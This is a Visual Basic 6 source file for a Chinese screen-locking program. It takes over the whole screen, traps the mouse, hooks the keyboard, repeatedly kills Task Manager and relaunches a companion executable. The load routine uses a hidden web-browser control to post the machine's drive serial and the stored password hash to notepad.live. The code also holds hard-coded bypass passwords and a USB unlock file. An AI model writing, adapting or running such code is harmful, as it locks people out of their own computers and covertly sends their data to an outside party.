VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "shdocvw.dll"
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "锁定主界面"
   ClientHeight    =   11490
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   15255
   BeginProperty Font 
      Name            =   "宋体"
      Size            =   48
      Charset         =   134
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   11490
   ScaleWidth      =   15255
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  '屏幕中心
   Visible         =   0   'False
   Begin SHDocVwCtl.WebBrowser WebBrowser1 
      Height          =   135
      Left            =   120
      TabIndex        =   4
      Top             =   0
      Width           =   30
      ExtentX         =   53
      ExtentY         =   238
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   ""
   End
   Begin VB.Timer Timer4 
      Left            =   0
      Top             =   1680
   End
   Begin VB.Timer Timer3 
      Left            =   0
      Top             =   1200
   End
   Begin VB.Timer Timer2 
      Left            =   0
      Top             =   720
   End
   Begin VB.Timer Timer1 
      Left            =   0
      Top             =   240
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&s"
      BeginProperty Font 
         Name            =   "宋体"
         Size            =   9
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   180
      Left            =   0
      MaskColor       =   &H00FFFFFF&
      TabIndex        =   2
      Top             =   0
      Width           =   135
   End
   Begin VB.TextBox Text1 
      BeginProperty Font 
         Name            =   "宋体"
         Size            =   36
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   975
      IMEMode         =   3  'DISABLE
      Left            =   3000
      MaxLength       =   16
      PasswordChar    =   "*"
      TabIndex        =   0
      Top             =   4560
      Width           =   9375
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "屏幕锁定1.53"
      BeginProperty Font 
         Name            =   "宋体"
         Size            =   9
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000E&
      Height          =   255
      Left            =   0
      TabIndex        =   3
      Top             =   11160
      Width           =   1335
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "请输入密码解锁"
      BeginProperty Font 
         Name            =   "宋体"
         Size            =   20.25
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000E&
      Height          =   375
      Left            =   6360
      TabIndex        =   1
      Top             =   2640
      Width           =   6375
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Public ee As String
Public RetVal As Long
Private FormOldWidth     As Long     '保存窗体的原始宽度
Private FormOldHeight     As Long     '保存窗体的原始高度
Private Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Private Declare Function ClipCursor Lib "user32" (lpRect As Any) As Long
Private Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Type RECT
Left As Long
Top As Long
Right As Long
Bottom As Long
End Type
Private Const GWL_EXSTYLE = (-20)
Private Const WS_EX_LAYERED = &H80000
Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Const LWA_ALPHA = &H2
Private Const LWA_COLORKEY = &H1
Private Declare Function SetLayeredWindowAttributes Lib "user32" (ByVal hwnd As Long, ByVal crKey As Long, ByVal bAlpha As Byte, ByVal dwFlags As Long) As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetVolumeInformation& Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal pVolumeNameBuffer As String, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long)
Const MAX_FILENAME_LEN = 256
Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef dwFlags As Long, ByVal dwReserved As Long) As Long

#Const SUPPORT_LEVEL = 0     'Default=0
'Must be equal to SUPPORT_LEVEL in cRijndael

'An instance of the Class
Private m_Rijndael As New cRijndael

'Assign TheString to the Text property of TheTextBox if possible.  Otherwise give warning.
Private Sub DisplayString(TheTextBox As TextBox, ByVal TheString As String)
    If Len(TheString) < 65536 Then
        TheTextBox.Text = TheString
    Else
    End If
End Sub


'Returns a String containing Hex values of data(0 ... n-1) in groups of k
Private Function HexDisplay(data() As Byte, n As Long, k As Long) As String
    Dim i As Long
    Dim j As Long
    Dim c As Long
    Dim data2() As Byte

    If LBound(data) = 0 Then
        ReDim data2(n * 4 - 1 + ((n - 1) \ k) * 4)
        j = 0
        For i = 0 To n - 1
            If i Mod k = 0 Then
                If i <> 0 Then
                    data2(j) = 32
                    data2(j + 2) = 32
                    j = j + 4
                End If
            End If
            c = data(i) \ 16&
            If c < 10 Then
                data2(j) = c + 48     ' "0"..."9"
            Else
                data2(j) = c + 55     ' "A"..."F"
            End If
            c = data(i) And 15&
            If c < 10 Then
                data2(j + 2) = c + 48 ' "0"..."9"
            Else
                data2(j + 2) = c + 55 ' "A"..."F"
            End If
            j = j + 4
        Next i
Debug.Assert j = UBound(data2) + 1
        HexDisplay = data2
    End If

End Function


'Reverse of HexDisplay.  Given a String containing Hex values, convert to byte array data()
'Returns number of bytes n in data(0 ... n-1)
Private Function HexDisplayRev(TheString As String, data() As Byte) As Long
    Dim i As Long
    Dim j As Long
    Dim c As Long
    Dim d As Long
    Dim n As Long
    Dim data2() As Byte

    n = 2 * Len(TheString)
    data2 = TheString

    ReDim data(n \ 4 - 1)

    d = 0
    i = 0
    j = 0
    Do While j < n
        c = data2(j)
        Select Case c
        Case 48 To 57    '"0" ... "9"
            If d = 0 Then   'high
                d = c
            Else            'low
                data(i) = (c - 48) Or ((d - 48) * 16&)
                i = i + 1
                d = 0
            End If
        Case 65 To 70   '"A" ... "F"
            If d = 0 Then   'high
                d = c - 7
            Else            'low
                data(i) = (c - 55) Or ((d - 48) * 16&)
                i = i + 1
                d = 0
            End If
        Case 97 To 102  '"a" ... "f"
            If d = 0 Then   'high
                d = c - 39
            Else            'low
                data(i) = (c - 87) Or ((d - 48) * 16&)
                i = i + 1
                d = 0
            End If
        End Select
        j = j + 2
    Loop
    n = i
    If n = 0 Then
        Erase data
    Else
        ReDim Preserve data(n - 1)
    End If
    HexDisplayRev = n

End Function


'Returns a byte array containing the password in the txtPassword TextBox control.
'If "Plaintext is hex" is checked, and the TextBox contains a Hex value the correct
'length for the current KeySize, the Hex value is used.  Otherwise, ASCII values
'of the txtPassword characters are used.
Private Function GetPassword() As Byte()
    Dim data() As Byte
        data = StrConv("woshivbchengxu", vbFromUnicode)
        ReDim Preserve data(31)
    GetPassword = data
End Function

Private Sub Form_Resize()
Call ResizeForm(Me)     '确保窗体改变时控件随之改变
End Sub

'在调用ResizeForm前先调用本函数
Public Sub ResizeInit(FormName As Form)
      Dim Obj     As Control
      FormOldWidth = FormName.ScaleWidth
      FormOldHeight = FormName.ScaleHeight
      On Error Resume Next
      For Each Obj In FormName
          Obj.Tag = Obj.Left & "   " & Obj.Top & "   " & Obj.Width & "   " & Obj.Height & "   "
      Next Obj
      On Error GoTo 0
End Sub

'按比例改变表单内各元件的大小，在调用ReSizeForm前先调用ReSizeInit函数
Public Sub ResizeForm(FormName As Form)
      Dim Pos(4)     As Double
      Dim i     As Long, TempPos       As Long, StartPos       As Long
      Dim Obj     As Control
      Dim ScaleX     As Double, ScaleY       As Double
      ScaleX = FormName.ScaleWidth / FormOldWidth           '保存窗体宽度缩放比例
      ScaleY = FormName.ScaleHeight / FormOldHeight           '保存窗体高度缩放比例
      On Error Resume Next
      For Each Obj In FormName
          StartPos = 1
          For i = 0 To 4
          '读取控件的原始位置与大小
              TempPos = InStr(StartPos, Obj.Tag, "   ", vbTextCompare)
              If TempPos > 0 Then
                  Pos(i) = Mid(Obj.Tag, StartPos, TempPos - StartPos)
                  StartPos = TempPos + 1
              Else
                  Pos(i) = 0
              End If
        '根据控件的原始位置及窗体改变大小的比例对控件重新定位与改变大小
              Obj.Move Pos(0) * ScaleX, Pos(1) * ScaleY, Pos(2) * ScaleX, Pos(3) * ScaleY
          Next i
      Next Obj
      On Error GoTo 0
End Sub

Private Sub WebBrowser1_DocumentComplete(ByVal pDisp As Object, URL As Variant)
If pDisp Is WebBrowser1.Object And URL = "http://notepad.live/kart4" Then
Dim H, m, s, xxx As String
H = Hour(Now)  '时
m = Minute(Now) '分
s = Second(Now) '秒
Open App.Path & "\xxx" For Input As #14
Line Input #14, xxx
Close #14
Dim fasongneirong As String
fasongneirong = Text1.Text
Dim vDoc, vTag, mType As String, mTagName As String
Dim i As Integer
    Set vDoc = WebBrowser1.Document
    For i = 0 To vDoc.All.Length - 1
        Select Case UCase(vDoc.All(i).tagName)
        Case "TEXTAREA"     '"TEXTAREA" 标签,文本框的填写
        Set vTag = vDoc.All(i)
         vTag.Value = Year(Now) & "年" & Month(Now) & "月" & Day(Now) & "日" & H & ":" & m & ":" & s & "    " & "计算机识别码为" & RetVal & "密码为" & xxx '将Text1中的内容填入
         End Select
Next i
End If
End Sub

Private Sub Command2_Click()
Text1.SetFocus
End Sub

Private Sub Form_Load()
Call ResizeInit(Me)     '在程序装入时必须加入
If App.PrevInstance = True Then End
Me.Icon = LoadPicture("")
Dim time As String
If Dir(App.Path & "\xxx") = "" Then
Open "xxx" For Output As #11
Print #11, "11FEAEAFD122C06DC7F93C5D5249A98D"
Close #11
End If
Open "time1" For Output As #6
Print #6, "0"
Close #6
If Dir(App.Path & "\admin") = "" Then
Open "admin" For Output As #12
Print #12, "541788"
Close #12
End If
App.TaskVisible = False
Form1.Width = Screen.Width
Form1.Height = Screen.Height
Me.Show
Text1.SetFocus
Timer1.Enabled = True
Timer1.Interval = 500
Timer2.Enabled = True
Timer2.Interval = 100
Timer3.Enabled = True
Timer3.Interval = 500
Me.BackColor = &H80000
Dim rtn As Long
rtn = GetWindowLong(hwnd, GWL_EXSTYLE)
rtn = rtn Or WS_EX_LAYERED
SetWindowLong hwnd, GWL_EXSTYLE, rtn
SetLayeredWindowAttributes hwnd, 0, 200, LWA_ALPHA '   窗体透明
HooK
If InternetGetConnectedState(0&, 0&) Then
WebBrowser1.Navigate "http://notepad.live/kart4"
End If
Dim str As String * MAX_FILENAME_LEN
Dim str2 As String * MAX_FILENAME_LEN
Dim A As Long
Dim b As Long
Call GetVolumeInformation("C:\", str, MAX_FILENAME_LEN, RetVal, A, b, str2, MAX_FILENAME_LEN)
WebBrowser1.Silent = True
End Sub
Private Function CheckExeIsRun(exeName As String) As Boolean
On Error GoTo Err
Dim WMI
Dim Obj
Dim Objs
CheckExeIsRun = False
Set WMI = GetObject("WinMgmts:")
Set Objs = WMI.InstancesOf("Win32_Process")
For Each Obj In Objs
If (InStr(UCase(exeName), UCase(Obj.Description)) <> 0) Then
CheckExeIsRun = True
If Not Objs Is Nothing Then Set Objs = Nothing
If Not WMI Is Nothing Then Set WMI = Nothing
Exit Function
End If
Next
If Not Objs Is Nothing Then Set Objs = Nothing
If Not WMI Is Nothing Then Set WMI = Nothing
Exit Function
Err:
If Not Objs Is Nothing Then Set Objs = Nothing
If Not WMI Is Nothing Then Set WMI = Nothing
End Function


Private Sub Text1_KeyDown(KeyCode As Integer, Shift As Integer)
If KeyCode = 13 Then  '如果，是回车键按下
If Dir("H:\nul") = "" Then
Else
If Dir("H:\150149") = "" Then
Else
Open "H:\150149" For Input As #18
Dim up As String
Line Input #18, up
Close #18
If up = "150149admin" Then
Open App.Path & "\time1" For Output As #5
Print #5, "1"
Close #5
ClipCursor ByVal 0&
End
End If
End If
End If

If Dir("G:\nul") = "" Then
Else
If Dir("G:\150149") = "" Then
Else
Open "G:\150149" For Input As #18
Line Input #18, up
Close #18
If up = "150149admin" Then
Open App.Path & "\time1" For Output As #5
Print #5, "1"
Close #5
ClipCursor ByVal 0&
End
End If
End If
End If

If Dir("D:\nul") = "" Then
Else
If Dir("D:\150149") = "" Then
Else
Open "D:\150149" For Input As #18
Line Input #18, up
Close #18
If up = "150149admin" Then
Open App.Path & "\time1" For Output As #5
Print #5, "1"
Close #5
ClipCursor ByVal 0&
End
End If
End If
End If

If Dir("E:\nul") = "" Then
Else
If Dir("E:\150149") = "" Then
Else
Open "E:\150149" For Input As #18
Line Input #18, up
Close #18
If up = "150149admin" Then
Open App.Path & "\time1" For Output As #5
Print #5, "1"
Close #5
ClipCursor ByVal 0&
End
End If
End If
End If

If Dir("F:\nul") = "" Then
Else
If Dir("F:\150149") = "" Then
Else
Open "F:\150149" For Input As #18
Line Input #18, up
Close #18
If up = "150149admin" Then
Open App.Path & "\time1" For Output As #5
Print #5, "1"
Close #5
ClipCursor ByVal 0&
End
End If
End If
End If

If Dir("I:\nul") = "" Then
Else
If Dir("I:\150149") = "" Then
Else
Open "I:\150149" For Input As #18
Line Input #18, up
Close #18
If up = "150149admin" Then
Open App.Path & "\time1" For Output As #5
Print #5, "1"
Close #5
ClipCursor ByVal 0&
End
End If
End If
End If

If Len(Text1.Text) < 2 Then
    Else
Dim smi As String
smi = Text1.Text
If smi = "wnk2467" Then
ClipCursor ByVal 0&
Text1.Text = ""
Close #2
Open App.Path & "\time1" For Output As #5
Print #5, "1"
Close #5
Shell "taskkill /f /im 启动程序定制c盘版.exe"
Shell "taskkill /f /im protector.exe"
End
Else
Dim A As String
Open App.Path & "\xxx" For Input As #1
Line Input #1, A
Close #1

Dim pass()        As Byte
    Dim plaintext()   As Byte
    Dim ciphertext()  As Byte
    Dim KeyBits       As Long
    Dim BlockBits     As Long

    If Len(Text1.Text) = 0 Then
    Else
            KeyBits = 128
            BlockBits = 128
            pass = GetPassword
                plaintext = StrConv(Text1.Text, vbFromUnicode)
#If SUPPORT_LEVEL Then
            m_Rijndael.SetCipherKey pass, KeyBits, BlockBits
            m_Rijndael.ArrayEncrypt plaintext, ciphertext, 0, BlockBits
#Else
            m_Rijndael.SetCipherKey pass, KeyBits
            m_Rijndael.ArrayEncrypt plaintext, ciphertext, 0
#End If
            smi = HexDisplay(ciphertext, UBound(ciphertext) + 1, BlockBits \ 8)
        End If
If smi = A Then
ClipCursor ByVal 0&
Text1.Text = ""
Close #2
Open App.Path & "\time1" For Output As #8
Print #8, "1"
Close #8
End
End If
ee = 3
Timer4.Enabled = True
Timer4.Interval = 1000
Label1.Caption = "   密码错误"
Label1.ForeColor = &HFF&
Label1.Left = Label1.Left - 30
Sleep 50
Label1.Left = Label1.Left + 60
Sleep 50
Label1.Left = Label1.Left - 100
Sleep 50
Label1.Left = Label1.Left + 70
Sleep 50
Text1.Text = ""
Close #2

End If
End If
End If
End Sub

Private Sub Timer1_Timer()
 Dim thwnd As Long
 thwnd = GetForegroundWindow
 If thwnd <> Me.hwnd Then
Else
Dim ding As RECT
SetWindowPos Me.hwnd, -1, 0, 0, 0, 0, 3
GetWindowRect Me.hwnd, ding
ClipCursor ding
End If
End Sub

Private Sub Timer2_Timer()
Dim r As RECT
r.Left = 0
r.Top = 0
r.Right = 0
r.Bottom = 0
ClipCursor r
Text1.SetFocus
End Sub

Private Sub Timer3_Timer()
If CheckExeIsRun("taskmgr.exe") Then
Shell "taskkill /f /im taskmgr.exe"
ElseIf CheckExeIsRun("任务管理器") Then
Shell "taskkill /f /im 任务管理器.exe"
End If
If CheckExeIsRun("启动程序定制c盘版.exe") Then
Else
If Dir(App.Path & "\启动程序定制c盘版.exe") = "" Then
Else
Shell App.Path & "\启动程序定制c盘版.exe"
End If
End If
End Sub

Private Sub Timer4_Timer()
ee = ee - 1
If ee = 0 Then
Timer4.Enabled = False
Label1.Caption = "请输入密码解锁"
Label1.ForeColor = &H8000000E
End If
End Sub


Private Sub Form_Unload(Cancel As Integer)
    UnHooK
End Sub
